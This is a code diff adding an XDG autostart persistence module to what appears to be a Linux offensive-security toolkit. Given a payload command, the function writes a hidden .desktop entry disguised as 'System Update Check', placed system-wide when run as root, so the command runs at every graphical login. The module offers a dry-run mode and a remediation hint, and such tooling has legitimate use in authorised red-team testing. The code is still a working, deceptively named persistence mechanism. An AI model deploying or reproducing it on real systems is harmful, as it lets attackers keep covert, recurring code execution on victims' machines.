@@ -641,3 +641,61 @@ fi
 
   return { output: output.join("\n"), findings }
 }
+
+export async function xdgAutostart(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== XDG Autostart Persistence ==="]
+  const payload = argVal(args, "--payload")
+  const name = argVal(args, "--name") || "system-update"
+
+  const script = `
+echo "--- XDG Autostart Directories ---"
+for d in /etc/xdg/autostart ~/.config/autostart; do
+  if [ -d "$d" ]; then
+    writable=$([ -w "$d" ] && echo "WRITABLE" || echo "read-only")
+    count=$(ls -1 "$d"/*.desktop 2>/dev/null | wc -l)
+    echo "  $d: $count entries ($writable)"
+  else
+    echo "  $d: does not exist"
+  fi
+done
+echo ""
+${payload ? `
+echo "--- Installing XDG Autostart ---"
+target_dir="$HOME/.config/autostart"
+if [ "$(id -u)" = "0" ] && [ -d /etc/xdg/autostart ]; then
+  target_dir="/etc/xdg/autostart"
+fi
+mkdir -p "$target_dir" 2>/dev/null
+cat > "$target_dir/${name}.desktop" << DESKTOP
+[Desktop Entry]
+Type=Application
+Name=System Update Check
+Exec=${payload}
+Hidden=false
+NoDisplay=true
+X-GNOME-Autostart-enabled=true
+DESKTOP
+echo "[+] XDG autostart entry created: $target_dir/${name}.desktop"
+` : `echo "[*] Dry run — pass --payload <cmd> --name <entry-name> to install."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] XDG autostart entry created")) {
+    findings.push({
+      checkId: "LNX-XDG-001",
+      provider: "linuxhook",
+      severity: "MEDIUM",
+      status: "INSTALLED",
+      resource: "xdg_autostart",
+      title: "XDG autostart persistence installed",
+      details: `Desktop entry ${name}.desktop created — executes on GUI session login`,
+      remediation: "Audit /etc/xdg/autostart/ and ~/.config/autostart/ for unauthorized .desktop files.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
